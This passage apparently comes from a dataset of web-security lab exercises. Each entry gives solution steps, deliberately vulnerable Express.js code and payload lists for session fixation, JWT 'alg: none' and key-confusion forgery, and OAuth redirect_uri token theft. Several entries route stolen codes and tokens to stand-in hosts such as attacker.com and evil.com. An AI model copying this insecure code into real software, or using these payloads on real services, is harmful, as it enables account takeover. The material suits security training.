      "Trick victim to log in while using preset sessionid=attackersession123",
      "Use same sessionid=attackersession123 post victim login to hijack the session"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Handling in Login Endpoint",
    "Lab Description": "The application's login flow allows session tokens to be set prior to authentication, and the token remains valid post-login. The application fails to invalidate pre-login session cookies. To solve: hijack a session by fixing the session token before authentication and access the target's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login request before logging in and note the issued session cookie.",
      "Log in using valid credentials while retaining the same session cookie manually set in the browser.",
      "Craft an attack scenario where you send the fixed session ID to the victim, encouraging them to log in using this session.",
      "After the victim logs in, reuse the fixed session token to gain access to their authenticated account.",
      "Visit /account with the victim's session to verify access and confirm lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sessionId = req.cookies.session || 'guest123'; res.cookie('session', sessionId); res.send('Session initialized.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.session === 'guest123') { res.status(403).send('Access denied'); } else { res.send('Account details for valid session holder'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=attackerKnownSession",
      "Manually reuse fixed session token post-login",
      "Session fixation with pre-set cookie prior to authentication"
    ]
  },
  {
    "Lab scenario": "JWT Token Tampering in Authorization Header",
    "Lab Description": "The application uses a JSON Web Token (JWT) for session control but does not validate the token signature properly. The application decodes the token but skips signature validation when the 'alg' header is set to 'none'. To solve: craft a JWT token with modified privileges to access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to intercept the Authorization header and decode the JWT using jwt.io.",
      "Confirm the token uses the HS256 algorithm and note the payload structure.",
      "Modify the JWT 'alg' field to 'none' and change the user role in the payload to 'admin'.",
      "Reconstruct the token without a signature and use it in the Authorization header.",
      "Access /admin-panel and verify admin-level access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'weak_secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin access granted.'); } else { res.status(403).send('Access denied.'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "Final Token: header.payload."
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Redirect URI",
    "Lab Description": "The application relies on OAuth 2.0 authorization but accepts arbitrary redirect URIs after authorization. This allows attackers to intercept the authorization code. To solve: manipulate the redirect URI to capture Carlos's OAuth code and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth login flow and the redirection after the /authorize endpoint.",
      "Modify the redirect_uri parameter to point to your attacker-controlled server (e.g., http://attacker.com/callback).",
      "Trigger Carlos to initiate an OAuth flow via social engineering, intercept the code parameter at your callback server.",
      "Exchange the intercepted authorization code for an access token using Postman against the /token endpoint.",
      "Use the access token to request Carlos's profile via /api/user and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, code } = req.query; res.redirect(`${redirect_uri}?code=authcode123`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'valid_token_carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_carlos') { res.json({ user: 'Carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.listen(4002);",
    "payloads": [
      "redirect_uri=http://attacker.com/callback",
      "OAuth Authorization Code: authcode123",
      "Access Token: valid_token_carlos"
    ]
  },
  {
    "Lab scenario": "Session Mismanagement Flaw in Access Control for REST API",
    "Lab Description": "This application's REST API uses session IDs set via URL parameters rather than cookies. The server-side logic trusts any session ID provided in the URL without validating user context. To solve: steal and reuse a session ID from a public source to hijack an active session and access another user's sensitive data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Using Burp Suite, intercept a GET /api/profile request and observe the session parameter in the URL.",
      "Use OWASP ZAP's Spider to enumerate all linked session IDs stored in JavaScript or comments.",
      "Extract an exposed session ID from a cached JavaScript file or history log.",
      "Replay the intercepted session ID by sending GET /api/profile?session=stolen-session-id in Postman.",
      "Confirm that the response returns another user's data and access the /api/admin endpoint for full privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = { 'abcd1234': 'carlos', 'efgh5678': 'admin' }; app.get('/api/profile', (req, res) => { const user = sessions[req.query.session]; if (!user) { return res.status(401).send('Invalid session'); } res.send(`Welcome back ${user}`); }); app.get('/api/admin', (req, res) => { const user = sessions[req.query.session]; if (user === 'admin') { res.send('Admin panel accessed'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000);",
    "payloads": [
      "?session=abcd1234",
      "?session=efgh5678",
      "GET /api/profile?session=valid-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Secret Exposure through Verbose Error Responses",
    "Lab Description": "This application's JWT implementation logs signature verification failures verbosely, accidentally revealing the HMAC secret in server debug logs. To solve: trigger error messages and extract the secret to forge a valid admin token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, send an intentionally corrupted JWT to the /validate endpoint and observe server response headers and body.",
      "Use OWASP ZAP passive scanning to detect if error messages leak the HMAC secret.",
      "Once the secret appears in logs, reconstruct a valid JWT using jwt.io or Node.js jwt.sign() with role=admin.",
      "Use Postman to send the forged JWT in the Authorization header.",
      "Access the /admin-dashboard endpoint to confirm the token works and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'superSecretDebugKey'; app.use(express.json()); app.post('/validate', (req, res) => { try { jwt.verify(req.body.token, secret); res.send('Token valid'); } catch (err) { res.status(401).send(`Verification failed: ${err.message} | Secret: ${secret}`); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5001);",
    "payloads": [
      "JWT with { \"alg\": \"HS256\", \"role\": \"admin\" }",
      "JWT Header: { \"alg\": \"none\" }",
      "JWT Signature using extracted 'superSecretDebugKey'"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "The OAuth authorization server allows open redirect URIs with wildcard matching. An attacker can craft a malicious redirect_uri to intercept authorization codes. To solve: manipulate the redirect_uri to exfiltrate another user's OAuth code and redeem it for their access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth flow and identify the wildcard nature of the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to http://evil.com/steal?code=.",
      "Trigger a victim user into clicking the OAuth login link by social engineering.",
      "On your server (http://evil.com), capture the authorization code from the URL.",
      "Send a POST request to the /token endpoint using Postman to exchange the intercepted code for an access token, then retrieve the victim's account info from the /profile endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { return res.redirect(`${redirect_uri}?code=authcode123`); } res.status(400).send('Invalid redirect_uri'); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'access-token-for-carlos' }); } else { res.status(400).json({ error: 'Invalid authorization code' }); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Invalid token' }); } }); app.listen(5002);",
    "payloads": [
      "redirect_uri=http://evil.com/steal",
      "OAuth Authorization Code: authcode123",
      "access_token=access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature confusion in token validation logic",
    "Lab Description": "The application uses JWT tokens for authentication but incorrectly validates the 'alg' field, trusting user-supplied algorithms. If the header specifies 'none', the signature check is skipped entirely. To solve: forge a JWT token assigning yourself 'admin' privileges and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite from the Authorization header.",
      "Use Postman to modify the JWT header by changing \"alg\" to \"none\" and removing the signature section.",
      "Send the manipulated token with 'role=admin' in the payload back in the Authorization header using Postman.",
      "Observe that the server accepts the token due to the 'none' algorithm and grants admin access.",
      "Visit /admin-dashboard using the forged token to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const token = jwt.sign({ username: req.body.username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5003);",
    "payloads": [
      "JWT Header: { \"alg\": \"none\" }, Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
      "JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation through predictable session identifiers",
    "Lab Description": "The application issues session identifiers that are directly derived from the username in a weak hash form. An attacker can predict valid session tokens based on this pattern and hijack active sessions. To solve: predict and reuse a valid session ID to access Carlos's account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Using Burp Suite, log in with a known username and observe the session cookie format.",
      "Use OWASP ZAP to brute-force the MD5 hash of known usernames, confirming the session ID is md5(username).",
      "Craft a session cookie using the MD5 hash of 'carlos' (e.g., md5('carlos')).",
      "Set the forged session cookie in your browser using Burp Suite or Postman.",
      "Access /my-account and confirm Carlos's profile is displayed to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const crypto = require('crypto'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = crypto.createHash('md5').update(req.query.username).digest('hex'); res.cookie('session', session); res.send(`Session created for ${req.query.username}`); }); app.get('/my-account', (req, res) => { const sessions = { 'carlos': crypto.createHash('md5').update('carlos').digest('hex') }; if (req.cookies.session === sessions['carlos']) { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(5004);",
    "payloads": [
      "Session Cookie: 2c9a8e6e5d92c3cc2d244360d6b6742f (MD5 of 'carlos')",
      "Cookie: session=2c9a8e6e5d92c3cc2d244360d6b6742f",
      "GET /my-account with forged Cookie"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect flaw in authorization endpoint",
    "Lab Description": "The OAuth provider used by this application allows redirection to arbitrary URLs under the same domain wildcard. This allows attackers to steal OAuth codes by tricking users into clicking crafted links. To solve: craft an OAuth URL that redirects to a malicious endpoint and extract a valid code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the authorization request and identify the redirect_uri parameter accepting wildcards.",
      "Alter the redirect_uri to redirect to http://attacker.com/callback within the allowed wildcard scope.",
      "Send the crafted OAuth link to a victim via phishing or social engineering.",
      "Capture the code on http://attacker.com/callback after the victim authenticates.",
      "Exchange the stolen code for a token at /oauth/token and access the victim's /profile via Postman."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; if (redirectUri.startsWith('http://trusted.com')) { res.redirect(`${redirectUri}?code=stealable-code`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/oauth/token', (req, res) => { if (req.body.code === 'stealable-code') { res.json({ access_token: 'user-token' }); } else { res.status(401).json({ error: 'Invalid code' }); } }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5005);",
    "payloads": [
      "redirect_uri=http://trusted.com.attacker.com/callback",
      "Authorization Code: stealable-code",
      "access_token=user-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-set Session ID in Login Endpoint",
    "Lab Description": "The application allows clients to specify a session ID before authentication is complete. The server trusts this session and associates it with the authenticated user without generating a new one. To solve: predefine a session ID, log in as your user, then reuse the same ID to hijack Carlos's session.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to capture the POST /login request while logging in with your own credentials.",
      "Notice the client-supplied session_id parameter being echoed back in the Set-Cookie header.",
      "Craft a session fixation attack by manually setting session_id to 'carlos-session' before login.",
      "Share the crafted session ID with the victim, or wait for them to log in using the same session_id.",
      "After Carlos logs in, access /my-account while sending the fixed session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/login', (req, res) => { const { username, password, session_id } = req.body; if (username === 'carlos' && password === 'supersecret') { sessions[session_id] = username; res.cookie('session', session_id).send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5006);",
    "payloads": [
      "POST /login session_id=carlos-session&username=wiener&password=peter",
      "Reuse session cookie: session=carlos-session",
      "GET /my-account with Cookie: session=carlos-session"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
    "Lab Description": "The application uses JWT for session handling but fails to validate the signature when 'alg' is set to 'none'. The server mistakenly trusts the unverified payload. To solve: craft a JWT with admin privileges and access the admin section using the unsigned token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using OWASP ZAP from an authenticated user request.",
      "Decode the token using jwt.io or Postman to inspect the header and payload.",
      "Modify the header to { \"alg\": \"none\" } and the payload to { \"username\": \"admin\", \"role\": \"admin\" }, omitting the signature.",
      "Resend the crafted JWT in the Authorization header via Postman.",
      "Visit /admin-panel and verify the server grants admin access, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome to the Admin Panel'); } else { res.status(403).send('Access denied'); } }); app.listen(5007);",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Crafted JWT Token: No signature required"
    ]
  },
  {
    "Lab scenario": "OAuth Token Leakage through Referer Header",
    "Lab Description": "The application uses OAuth 2.0 but the authorization code is exposed in the Referer header when redirected back to the client site. An attacker controlling a subdomain can harvest tokens via referer leakage. To solve: intercept the Referer header during login flow and extract the OAuth code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login flow and observe the final redirect to the application’s /callback endpoint.",
      "Set up a malicious site (e.g., http://attacker.com) that embeds the OAuth provider's authorize URL in an iframe.",
      "When the victim authenticates, the Referer header in their redirected request to /callback will expose the OAuth code to attacker.com logs.",
      "Extract the stolen code and exchange it for an access token using Postman.",
      "Use the token to access /profile as the victim and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const code = req.query.code; console.log('Received OAuth Code:', code); res.send(`Welcome back! OAuth code ${code} stored.`); }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer leaked-user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5008);",
    "payloads": [
      "Embed URL: https://authserver.com/oauth/authorize?client_id=abc&redirect_uri=http://victim.com/oauth/callback",
      "Captured Referer Leak: http://victim.com/oauth/callback?code=leaked-code",
      "Authorization: Bearer leaked-user-token"
    ]
  },
  {
    "Lab scenario": "Session Hijacking via Predictable Session Tokens in REST API",
    "Lab Description": "The application's REST API uses a predictable session token generation scheme based on the username and a static salt. The application does not rotate the token post-login, allowing attackers to precompute tokens for valid users. To solve: predict Carlos's session token and access his profile endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture your own /api/login response using Postman and observe the returned token format.",
      "Reverse-engineer the token by analyzing the Base64-decoded structure, which is a concatenation of username and a static string.",
      "Manually craft a token for Carlos by applying the same pattern.",
      "Use the token in the Authorization header to query /api/user/profile.",
      "Verify successful access to Carlos's account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(bodyParser.json()); app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = Buffer.from(username + ':staticSalt').toString('base64'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); if (decoded.startsWith('carlos')) { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5010);",
    "payloads": [
      "Authorization: Bearer Y2FybG9zOnN0YXRpY1NhbHQ=",
      "Base64 of carlos:staticSalt",
      "Y2FybG9zOnN0YXRpY1NhbHQ="
    ]
  },
  {
    "Lab scenario": "JWT Signature Verification Bypass via Key Confusion Attack",
    "Lab Description": "The application uses JWTs to authorize users but fails to differentiate between HMAC and RSA algorithms. Attackers can forge valid tokens by switching the algorithm from RS256 to HS256 and signing it using the public key as the secret. To solve: forge an admin token and access the /admin route.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite during authentication.",
      "Download the public key from the exposed /.well-known/jwks.json endpoint.",
      "Craft a new token by changing the 'alg' header from 'RS256' to 'HS256' and sign it with the public key as the HMAC secret.",
      "Use the forged token in the Authorization header while requesting /admin.",
      "Confirm successful access to the admin section and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { jwt.verify(token, publicKey); const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send(err.message); } }); app.listen(5011);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "Signature: HMAC(publicKey, header.payload)",
      "Final JWT: [header].[payload].[signature]"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Leak via URL Fragment Hijacking",
    "Lab Description": "The OAuth implementation uses the implicit flow and returns access tokens in the URL fragment. Due to a lack of client-side sanitization, an attacker can manipulate redirect URIs to capture tokens via malicious subdomains. To solve: intercept an OAuth token using a crafted redirect URI and access Carlos's data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate an OAuth login flow with Burp Suite and observe the redirect URL containing the access token in the URL fragment.",
      "Host a malicious redirect_uri like http://attacker.com/capture.html that reads window.location.hash and sends it to your server.",
      "Change the OAuth redirect_uri to http://attacker.com/capture.html and trick Carlos into logging in.",
      "Once Carlos logs in, capture the token and use Postman to authenticate to /private-data.",
      "Verify that you’ve accessed Carlos’s data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/private-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') { res.json({ username: 'carlos', data: 'Sensitive info' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5012);",
    "payloads": [
      "Redirect URI: http://attacker.com/capture.html",
      "Captured Token: carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "GraphQL Session Fixation in Login Mutation",
    "Lab Description": "This lab’s GraphQL API suffers from session fixation due to insecure session token reuse. The application does not issue a fresh session ID upon login, allowing an attacker to fixate the victim's session. To solve: log in as Carlos after pre-setting the session token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the initial /graphql request and observe the Set-Cookie header with the session token.",
      "Send a crafted GraphQL mutation to login with your own credentials while retaining the fixed session token.",
      "Send the same session token to the victim, enticing them to log in (e.g., via social engineering).",
      "Once Carlos logs in, reuse the same fixed session token in your browser.",
      "Access /my-account using the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const schema = buildSchema(`type Query { dummy: String } type Mutation { login(username: String!, password: String!): String }`); const users = [{ username: 'carlos', password: 'supersecure' }]; const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { return req.cookies.session || 'fixed-session-token'; } else { throw new Error('Invalid credentials'); } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true })) ); app.listen(5015);",
    "payloads": [
      "{\"query\":\"mutation { login(username: \\\"carlos\\\", password: \\\"supersecure\\\") }\"}",
      "Cookie: session=fixed-session-token",
      "GraphQL Mutation with valid credentials using pre-fixed session cookie"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Acceptance in Authorization Header",
    "Lab Description": "This application trusts JWT tokens in the Authorization header without properly validating the algorithm field, accepting 'alg':'none'. Attackers can forge tokens without a valid signature. To solve: create an unsigned admin token and access the /admin-dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite during a login process.",
      "Modify the JWT header to set \"alg\" to \"none\" and strip the signature section.",
      "Change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Use Postman to send a request to /admin-dashboard with the forged Authorization Bearer token.",
      "Confirm that the admin dashboard is accessible and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { res.send('Welcome, Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(5016);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"} header JWT",
      "Unsigned admin JWT token"
    ]
  },
  {
    "Lab scenario": "OAuth Open Redirect and Token Leakage",
    "Lab Description": "This OAuth flow lacks proper redirect URI validation, allowing attackers to use open redirects to steal access tokens. The vulnerable behavior involves reflecting the access token in a user-controlled URL. To solve: steal Carlos's token via a malicious redirect URL and use it to access /private-files.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth redirect flow and identify the lack of a whitelist for redirect_uri.",
      "Craft a malicious redirect_uri pointing to https://attacker.com/capture?token={access_token}.",
      "Send a phishing link to Carlos containing this redirect_uri and wait for him to authenticate.",
      "Intercept the token at your attacker-controlled endpoint.",
      "Replay the token in the Authorization header using Postman to access /private-files and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { redirect_uri, token } = req.query; if (redirect_uri) { res.redirect(`${redirect_uri}?token=${token}`); } else { res.status(400).send('Missing redirect URI'); } }); app.get('/private-files', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Carlos confidential data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5017);",
    "payloads": [
      "https://attacker.com/capture?token={access_token}",
      "Authorization: Bearer carlos-oauth-token",
      "Phished token: carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "API Session Fixation via Predictable Session ID in REST Login",
    "Lab Description": "This application's REST login endpoint sets a session ID derived from the username hash, which can be predicted. The application fails to generate a new session token post-login. To solve: predetermine Carlos's session ID and access the /dashboard endpoint using this session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your own login attempt and observe the Set-Cookie session token format.",
      "Using NodeJS crypto library, predict the hash of the username 'carlos' to craft the expected session token.",
      "Manually set your browser's session cookie to the calculated 'carlos' token using Burp's 'Add Cookie' feature.",
      "Access the /dashboard endpoint with the forged session cookie.",
      "Confirm Carlos's account is accessible to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const crypto = require('crypto'); const app = express(); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); app.use(bodyParser.json()); app.use(cookieParser()); const users = ['alice', 'carlos']; app.post('/login', (req, res) => { const { username, password } = req.body; if (users.includes(username) && password === 'Password123') { const session = crypto.createHash('md5').update(username).digest('hex'); res.cookie('session', session); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === crypto.createHash('md5').update('carlos').digest('hex')) { res.send('Welcome Carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(5020);",
    "payloads": [
      "d404559f602eab6fd2d2fef748b9d3c0",
      "Set-Cookie: session=d404559f602eab6fd2d2fef748b9d3c0",
      "Predict hash: MD5('carlos')"
    ]
  },
  {
    "Lab scenario": "JWT Signature Confusion Vulnerability in Bearer Authorization",
    "Lab Description": "The application uses JWT tokens but inconsistently verifies the signature algorithm. If a token uses 'HS256' instead of 'RS256', the server misinterprets the public RSA key as a shared HMAC secret, enabling signature spoofing. To solve: craft a signed HS256 token impersonating the admin and access /admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite during a login process.",
      "Change the 'alg' in the header to 'HS256' and set the payload to {\"role\":\"admin\"}.",
      "Use the public RSA key (downloaded from the /.well-known/jwks.json endpoint) as the secret for HS256.",
      "Sign the token using any JWT library and send it via Authorization: Bearer.",
      "Access /admin and verify admin access is granted to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); app.listen(5021);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"role\":\"admin\"}",
      "Secret: [Public RSA Key from /.well-known/jwks.json]",
      "Valid HS256 signed admin token"
    ]
  },
  {
    "Lab scenario": "OAuth2 Implicit Flow Token Leak via Referer Header",
    "Lab Description": "This application uses OAuth2 implicit flow but embeds the access token in the URL fragment, causing the browser to leak the token via Referer headers. To solve: capture Carlos's token from the Referer log and replay it to access /protected.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept browsing after OAuth login and observe Referer headers in outgoing requests.",
      "Identify requests where the access_token appears in the Referer header directed to third-party resources.",
      "Extract the leaked token and use Postman to send a GET request to /protected with Authorization: Bearer.",
      "Access the protected page and confirm Carlos's data is exposed.",
      "Log the token reuse to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { res.send('<script>location.href=\"/welcome#access_token=carlos-oauth-token\"</script>'); }); app.get('/protected', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Protected data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5022);",
    "payloads": [
      "Referer: https://target.com/welcome#access_token=carlos-oauth-token",
      "Authorization: Bearer carlos-oauth-token",
      "Captured access_token from Referer log"
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL-based Token in Single-Page Application",
    "Lab Description": "This lab's single-page login flow passes session identifiers via the URL rather than setting them after authentication. The application reuses this identifier without regenerating it upon successful login. To solve: inject your own crafted session ID before Carlos logs in and hijack the session when he authenticates.",
